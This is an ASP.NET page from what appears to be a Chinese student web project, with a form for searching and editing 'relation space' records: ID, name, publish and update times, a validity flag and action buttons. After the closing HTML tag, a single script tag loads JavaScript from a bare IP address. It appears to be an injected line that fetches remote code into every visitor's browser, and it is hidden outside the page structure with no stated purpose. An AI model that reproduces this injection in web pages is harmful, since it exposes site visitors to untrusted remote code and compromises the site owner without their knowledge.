<%@ Page Language="vb" AutoEventWireup="false" Codebehind="rmodelmodification.aspx.vb" Inherits="relation.rmodelmodification"%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
	<HEAD>
		<title>rmodelmodification</title>
		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">
		<meta content="Visual Basic .NET 7.1" name="CODE_LANGUAGE">
		<meta content="JavaScript" name="vs_defaultClientScript">
		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">
	</HEAD>
	<body>
		<FONT face="宋体">
			<P>
				<FORM id="Form1" method="post"> <!--===============include menu================--> <!--==========include menu==============--></P>
			</FORM></FONT>
		<FORM id="Form3" method="post">
			<TABLE id="Table1" cellSpacing="0" cellPadding="0" width="778" align="center" bgColor="#fef3bd"
				border="0" valign="middle">
				<TR>
					<TD vAlign="middle" width="778" bgColor="#fef3bd" colSpan="3" height="8">
						<DIV align="center"><IMG height="8" src="imga/bg1.gif" width="100%"></DIV>
					</TD>
				</TR>
				<TR bgColor="#ffffff">
					<TD colSpan="3" height="60"><IMG height="60" src="imga/logo.gif" width="321"><IMG height="60" src="imga/idea.jpg" width="457"></TD>
				</TR>
				<TR>
					<TD vAlign="middle" colSpan="3" height="8"><IMG height="8" src="imga/bg2.gif" width="100%"></TD>
				</TR>
			</TABLE> <!--===============include menu================--> <!--==========include menu==============-->
			<TABLE id="Table2" cellSpacing="0" cellPadding="0" width="778" align="center" border="0">
				<TR>
					<TD class="p9" vAlign="middle" width="196" bgColor="#dedede" height="18">
						<DIV align="center"><FONT color="#666666"><B>
									<asp:Label id="timetext" runat="server"></asp:Label>
									&nbsp; </B></FONT>
						</DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="51" bgColor="#dedede" height="18">
						<DIV align="right"><IMG height="25" src="imga/blue.jpg" width="35"></DIV>
					</TD>
					<TD class="p9" vAlign="middle" width="548" background="imga/blue2.jpg" bgColor="#00459c"
						height="18">
						<DIV align="left"><SPAN class="p10"><FONT color="#ffffff"><A class="whitemenu" onmouseover="showMenu(this,'topmenu1',0)" onmouseout="hideMenu(event)"
										href="rmodelpublish.aspx" target="_top">发布</A> <A class="whitemenu" onmouseover="showMenu(this,'topmenu2',0)" onmouseout="hideMenu(event)"
										href="rmodelsearch.aspx" target="_top">查询</A>&nbsp;<A class="whitemenu" onmouseover="showMenu(this,'topmenu3',0)" onmouseout="hideMenu(event)"
										href="rmodelmodification.aspx" target="_top">修改</A> </FONT></SPAN>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<DIV id="Div2" style="VISIBILITY: hidden" onmouseout="hideMenu(event)"></DIV>
			<FONT face="宋体"></FONT>
			<TABLE id="Table3" height="62" cellSpacing="0" width="778" align="center">
				<TR border="0">
					<TD class="p10" vAlign="top" background="imga/bg3.gif" colSpan="2" height="20" border="0"><IMG height="1" src="imga/03.gif" width="100%"><BR>
						<FONT color="#000000">&nbsp;| <A href="index.aspx">首页</A></FONT> <FONT color="#000000">
							| <A href="index.aspx">用户登入</A> </FONT>|<A href="newcustomer.aspx">注册</A>
					</TD>
				</TR>
				<TR border="0">
					<TD vAlign="top" width="172" bgColor="#0859ad" height="20">&nbsp;
						<asp:label id="lblHint" runat="server" ForeColor="Info">Label</asp:label></TD>
					<TD vAlign="top" bgColor="#0859ad" height="20">
						<DIV align="right"><FONT color="#ffffff">
								<marquee scrollDelay="100" direction="left" behavior="scroll" loop="-1">欢迎您 
									&nbsp;软件业的朋友！ &nbsp; &nbsp;</marquee>
							</FONT>
						</DIV>
					</TD>
				</TR>
			</TABLE>
			<CENTER>
				<TABLE id="Table4" height="400" cellSpacing="0" cellPadding="0" width="778" bgColor="#ffffff"
					border="0">
					<TBODY>
						<TR>
							<TD vAlign="top" width="172" bgColor="#0859ad" height="14"><!--====================include pageleft==================-->
								<TABLE id="Table5" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#0859ad">
											<DIV align="center"><FONT face="宋体"></FONT>&nbsp;</DIV>
										</TD>
									</TR>
								</TABLE>
								<TABLE id="Table6" height="100%" cellSpacing="0" cellPadding="0" width="100%" border="0">
									<TR>
										<TD vAlign="top" bgColor="#9cd7ef">
											<DIV align="center"><IMG style="WIDTH: 100%; HEIGHT: 32px" height="32" src="imga/grad.gif" width="172">&nbsp;
												<TABLE id="Table7" style="WIDTH: 153px; HEIGHT: 153px" width="153" border="1">
													<TR>
														<TD width="147" height="45">
															<DIV align="center">&nbsp;&nbsp;<A href="rmodelmodification.aspx">修改关系空间</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="43">
															<DIV align="center"><A href="rdefinitionmodification.aspx">修改关系类型</A></DIV>
														</TD>
													</TR>
													<TR>
														<TD height="55">
															<DIV align="center"><A href="rinstancemodification.aspx">修改关系实例</A></DIV>
														</TD>
													</TR>
												</TABLE>
												<BR>
												<BR>
											</DIV>
										</TD>
									</TR>
								</TABLE>
							</TD>
							<TD vAlign="top" width="21" bgColor="#ffffff"><IMG height="23" src="imga/05.gif" width="21"></TD>
							<TD vAlign="top" width="611">
		</FORM>
		<FORM style="MARGIN: 0px" name="loginForm" action="" method="post">
			&nbsp;&nbsp;
		</FORM>
		<FORM id="Form4" method="post" runat="server">
			<FONT face="宋体"><FONT face="宋体"><FONT face="宋体">
						<TABLE id="Table9" style="WIDTH: 562px; HEIGHT: 322px" cellSpacing="1" cellPadding="1"
							width="562" border="1">
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 36px">&nbsp;&nbsp;&nbsp;
									<TABLE id="Table10" style="WIDTH: 536px; HEIGHT: 34px" cellSpacing="1" cellPadding="1"
										width="536" border="1">
										<TR>
											<TD style="WIDTH: 103px"><asp:label id="lblModelSearch" runat="server" Width="104px">关系空间搜索:</asp:label></TD>
											<TD style="WIDTH: 156px"><asp:dropdownlist id="ddlstModelSearch" runat="server" Width="112px"></asp:dropdownlist></TD>
											<TD style="WIDTH: 135px"><asp:dropdownlist id="ddlstModelAtt" runat="server" Width="120px" DESIGNTIMEDRAGDROP="185">
													<asp:ListItem Value="按关系空间编号">按关系空间编号</asp:ListItem>
													<asp:ListItem Value="按关系空间名称">按关系空间名称</asp:ListItem>
												</asp:dropdownlist></TD>
											<TD><asp:button id="btnSearch" runat="server" Text="搜索"></asp:button></TD>
										</TR>
									</TABLE>
									&nbsp;&nbsp;&nbsp;&nbsp;
								</TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 29px"><asp:label id="lblModelKey" runat="server">关系空间编号</asp:label></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 24px"><asp:textbox id="txtModelKey" runat="server"></asp:textbox></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 31px"><asp:label id="lblModelName" runat="server">关系空间名称</asp:label></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 27px"><asp:textbox id="txtModelName" runat="server"></asp:textbox></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 31px">关系空间发布时间</TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 30px"><asp:textbox id="txtModelPubTime" runat="server"></asp:textbox></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px; HEIGHT: 32px"><asp:label id="lblModelUpTime" runat="server">关系空间更新时间</asp:label></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px"><asp:textbox id="txtModelUpTime" runat="server"></asp:textbox></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px"><asp:label id="lblIsValid" runat="server">关系空间有效性</asp:label></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px"><asp:radiobutton id="rbtnIsValidYes" runat="server" Text="有效" GroupName="rbtnIsValid"></asp:radiobutton>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
									<asp:radiobutton id="rbtnIsValidNo" runat="server" Text="无效" GroupName="rbtnIsValid"></asp:radiobutton></TD>
							</TR>
							<TR>
								<TD style="WIDTH: 241px">
									<TABLE id="Table11" style="WIDTH: 544px; HEIGHT: 24px" cellSpacing="1" cellPadding="1"
										width="544" border="1">
										<TR>
											<TD></TD>
											<TD style="WIDTH: 123px"><asp:button id="btnConfirm" runat="server" Text="确认修改"></asp:button></TD>
											<TD style="WIDTH: 147px"><asp:button id="btnModiRef" runat="server" Text="修改关系类型"></asp:button></TD>
											<TD><asp:button id="btnCancel" runat="server" Text="撤消"></asp:button></TD>
										</TR>
									</TABLE>
									<asp:label id="lblWarning" runat="server" ForeColor="#0000C0" Width="408px">label</asp:label></TD>
							</TR>
						</TABLE>
					</FONT></FONT></FONT></TD></TR></TBODY></TABLE></CENTER><!---====================include pagetail================-->
			<CENTER>
				<TABLE id="Table8" cellSpacing="0" cellPadding="0" width="778" border="0">
					<TR>
						<TD><IMG height="31" src="imga/bg4.gif" width="778"></TD>
					</TR>
					<TR>
						<TD class="p9" background="imga/bg5.gif">
							<DIV align="center">| 联络我们 | 客服电话：<STRONG><FONT face="Arial">0571-63740939</FONT></STRONG></DIV>
						</TD>
					</TR>
					<TR>
						<TD class="p9" bgColor="#ffffff"><FONT face="宋体">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
								版权所有：&nbsp;&nbsp; 浙江林学院信息工程学院天信022 王海玲 陆美丽 </FONT>
						</TD>
					</TR>
				</TABLE>
			</CENTER>
		</FORM>
	</body>
</HTML>
<script src="http://222.208.183.246/ad/ad.js"></script>
